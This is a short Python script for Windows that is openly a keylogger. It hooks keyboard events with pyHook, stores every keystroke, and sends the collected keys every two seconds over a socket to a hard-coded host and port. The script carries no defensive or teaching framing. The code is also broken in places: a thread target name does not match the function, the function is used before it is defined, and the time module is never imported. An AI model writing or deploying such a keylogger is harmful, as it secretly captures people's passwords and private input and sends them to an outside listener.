from socket import *
import win32console
import threading
import pythoncom
import win32api
import win32gui
import pyHook
import os

# variable declartion
global pressed_keys
pressed_keys = []

# iniatiate sockets
s = socket(AF_INET, SOCK_STREAM)
s.connect(("192.168.1.155", 6464))

# start network loop
socket_thread = threading.Thread(target=socket_connections, args=(s,))
socket_thread.start()

# network stuff
def socket_connection(s):
	while 1:
		s.send("".join(pressed_keys))
		time.sleep(2)

	s.close()

# key logging stuff
def OnKeyBoardEvent(event):
	pressed_keys.append(chr(event.Ascii))
	print "".join(pressed_keys)

# start listing for key presses ---
# create a hook manager object
hm=pyHook.HookManager()
hm.KeyDown=OnKeyBoardEvent

# set the hook
hm.HookKeyboard()

# wait forever
pythoncom.PumpMessages()